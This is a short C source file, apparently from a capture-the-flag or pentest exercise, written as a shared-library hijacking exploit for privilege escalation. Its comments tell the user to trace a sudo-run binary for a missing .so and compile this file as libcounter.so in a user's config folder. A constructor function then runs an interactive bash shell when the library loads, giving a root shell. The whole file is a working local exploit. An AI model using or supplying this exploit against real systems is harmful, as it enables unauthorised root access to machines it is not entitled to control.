
// Hijack some binary call library (*.so) file.

// Example to see: 
// strace sudo /usr/bin/stock

// gcc -shared -fpic -o /home/rektsu/.config/libcounter.so priv-esclation.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
void method()__attribute__((constructor)); 
void method() {
    system("/bin/bash -i");
}


